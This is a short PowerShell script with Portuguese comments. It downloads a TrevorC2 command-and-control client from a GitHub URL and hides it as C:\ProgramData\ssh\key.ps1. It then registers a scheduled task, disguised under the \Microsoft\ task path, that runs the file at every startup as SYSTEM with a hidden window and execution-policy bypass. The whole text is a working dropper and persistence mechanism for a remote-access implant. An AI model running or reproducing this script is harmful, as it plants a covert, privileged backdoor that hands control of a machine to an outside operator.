# Baixa o script e salva em C:\ProgramData\ssh\key.ps1
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/giaosoissomsm/Webhooks/refs/heads/main/scripts/trevorc2_client.ps1" -OutFile "C:\ProgramData\ssh\key.ps1"

# Cria uma tarefa agendada para iniciar o script como SYSTEM na inicialização com privilégios mais altos
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-w h -ep bypass C:\ProgramData\ssh\key.ps1"
$trigger = New-ScheduledTaskTrigger -AtStartup
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest -LogonType ServiceAccount
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable

Register-ScheduledTask -TaskName "IniciarScriptKey" -Action $action -Trigger $trigger -Principal $principal -Settings $settings -TaskPath "\Microsoft\"
